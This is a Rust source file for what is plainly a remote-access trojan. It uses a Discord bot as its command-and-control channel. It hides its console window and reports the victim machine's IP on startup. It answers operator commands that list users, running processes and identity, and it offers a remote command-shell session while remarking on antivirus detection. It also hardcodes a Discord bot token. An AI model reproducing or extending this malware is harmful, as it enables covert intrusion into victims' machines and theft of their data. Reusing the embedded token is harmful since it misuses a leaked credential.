#![windows_subsystem = "windows"]

use std::sync::RwLock;
use std::time::Duration;

use serenity::{
    async_trait, client::Context, model::{channel::{Message}, gateway::Ready, id::{ChannelId}, application::interaction::InteractionResponseType}, prelude::*, futures::StreamExt,
};
use serenity::model::channel::ChannelType;

use uuid::Uuid;

mod commands;
use commands::recon::*;

mod utils;
use utils::utils::*;

static CHANNEL_NAME: RwLock<Option<Uuid>> = RwLock::new(None);
static CHANNEL_ID: RwLock<Option<ChannelId>> = RwLock::new(None);

struct Handler;


#[async_trait]
impl EventHandler for Handler {
    async fn message(&self, ctx: Context, msg: Message) {
        let channel_id = CHANNEL_ID.read().unwrap().as_ref().unwrap().to_string();

        if msg.channel_id.to_string() == channel_id {
            if msg.content == "!userlist" {
                if let Err(why) = msg.channel_id.say(&ctx.http, userlist()).await {
                    eprintln!("Error sending message: {:?}", why);
                }
            } else if msg.content == "!tasklist" {
                let tasklist_str = tasklist();
                let chunks = split_tasklist(&tasklist_str, 1900); // Discord has a 2000 character limit per message; 1900 gives some buffer

                for chunk in chunks {
                    if let Err(why) = msg.channel_id.say(&ctx.http, &chunk).await {
                        eprintln!("Error sending message: {:?}", why);
                    }
                }
            } else if msg.content == "!whoami" {
                if let Err(why) = msg.channel_id.say(&ctx.http, whoami()).await {
                    eprintln!("Error sending message: {:?}", why);
                }
            } else if msg.content == "!cmdsesh" {
                // Send a message with yes and no reactions
                let sent_message = msg
                    .channel_id
                    .send_message(&ctx.http, |m| {
                        m.content("Are you sure you want to create a remote shell session? (Note: This is more likely to be detected by AVs)")
                            .components(|c| {
                                c.create_action_row(|row| {
                                    // An action row can only contain one select menu!
                                    row.create_select_menu(|menu| {
                                        menu.custom_id("session_dialog");
                                        menu.placeholder("OPTIONS");
                                        menu.options(|f| {
                                            f.create_option(|o| o.label("✅ Yes").value("Yes"));
                                            f.create_option(|o| o.label("❌ No").value("No"))
                                        })
                                    })
                                })
                            })
                    })
                    .await
                    .unwrap();

                let interaction = match sent_message
                    .await_component_interaction(&ctx)
                    .timeout(Duration::from_secs(60 * 3))
                    .await
                {
                    Some(x) => x,
                    None => {
                        sent_message.reply(&ctx, "Timed out").await.unwrap();
                        return;
                    }
                };

                let decision = &interaction.data.values[0];

                if decision == "Yes" {
                    // Delete the original message
                    sent_message.delete(&ctx).await.unwrap();

                    // Create a new channel titled "cmd-session"
                    let guild_id = msg.guild_id.unwrap();
                    guild_id
                        .create_channel(&ctx.http, |c| {
                            c.name("live-cmd-session").kind(ChannelType::Text).category(1088662009945526282)
                        })
                        .await
                        .unwrap();
                } else if decision == "No" {
                    // Acknowledge the interaction and send an ephemeral message
                    interaction
                        .create_interaction_response(&ctx, |r| {
                            r.kind(InteractionResponseType::ChannelMessageWithSource)
                                .interaction_response_data(|d| {
                                    d.ephemeral(true)
                                        .content("User denied remote session creation")
                                })
                        })
                        .await
                        .unwrap();
                    // Delete the original message
                    sent_message.delete(&ctx).await.unwrap();
                }
            }
        }
    }


    async fn ready(&self, ctx: Context, ready: Ready) {
        println!("{} is connected!", ready.user.name);

        match get_or_create_uuid() {
            Ok(uuid) => {
                println!("UUID: {:?}", uuid);
                *CHANNEL_NAME.write().unwrap() = Some(uuid);
            }
            Err(e) => {
                eprintln!("Error creating file: {:?}", e);
                std::process::exit(1);
            }
        };

        // Create a text channel in the first guild the bot is connected to
        let guilds = &ready.guilds;
        if let Some(guild_id) = guilds.first().map(|g| g.id) {
            println!("GUILD ID: {:?}", guild_id);
            *CHANNEL_ID.write().unwrap() = get_uuid_channel(&ctx, Some(guild_id)).await;

            let channel_id = CHANNEL_ID.read().unwrap().unwrap();
            if let Err(why) = get_agent_ip(&ctx, channel_id).await {
                println!("Ran into error when sending ip sadly: {}", why);
            };
        }
    }
}


#[tokio::main]
async fn main() {
    // Configure the client with your Discord bot token in the environment.
    let token = String::from("MTA4NzQ2MzExMjY3ODA1NTkzNg.Gf19_l.w7FqiCApRPbPZWws6YVdRjUaT4jx7Ap_zJWlrY");

    // Set gateway intents, which decides what events the bot will be notified about
    let intents = GatewayIntents::GUILD_MESSAGES
        | GatewayIntents::DIRECT_MESSAGES
        | GatewayIntents::MESSAGE_CONTENT;

    // Create our client object with the token and intents, throws error if building the client.
    let mut client =
        Client::builder(&token, intents).event_handler(Handler).await.expect("Error when creating the client");

    if let Err(why) = client.start().await {
        println!("Client error: {:?}", why);
    }
}